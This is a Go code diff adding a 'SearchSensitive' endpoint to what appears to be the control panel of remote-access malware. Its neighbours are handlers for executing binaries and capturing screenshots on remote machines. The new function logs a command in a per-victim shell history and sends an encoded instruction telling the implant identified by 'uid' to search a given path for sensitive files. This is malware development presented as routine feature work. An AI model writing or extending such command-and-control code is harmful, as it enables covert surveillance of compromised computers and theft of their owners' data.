@@ -724,6 +724,35 @@ func ExecuteLinuxBin(c *gin.Context) {
 	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
 }
 
+func SearchSensitive(c *gin.Context) {
+	var req struct {
+		Uid  string `json:"uid"`
+		Path string `json:"path"`
+	}
+	if err := c.ShouldBindJSON(&req); err != nil {
+		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
+		return
+	}
+
+	req.Path = strings.TrimSpace(req.Path)
+	if req.Path == "" {
+		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "Path is required"})
+		return
+	}
+
+	var shellHistory database.Shell
+	database.Engine.Where("uid = ?", req.Uid).Get(&shellHistory)
+	shellHistory.ShellContent = shellHistory.ShellContent + "$ search-sensitive " + req.Path + "\n"
+	database.Engine.Where("uid = ?", req.Uid).Update(&shellHistory)
+
+	cmdTypeBytes := make([]byte, 4)
+	binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.SearchSensitive))
+	byteToSend := append(cmdTypeBytes, []byte(req.Path)...)
+	sendcommand.SendCommandBytes(req.Uid, byteToSend)
+
+	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
+}
+
 func CaptureScreenshot(c *gin.Context) {
 	var req struct {
 		Uid string `json:"uid"`
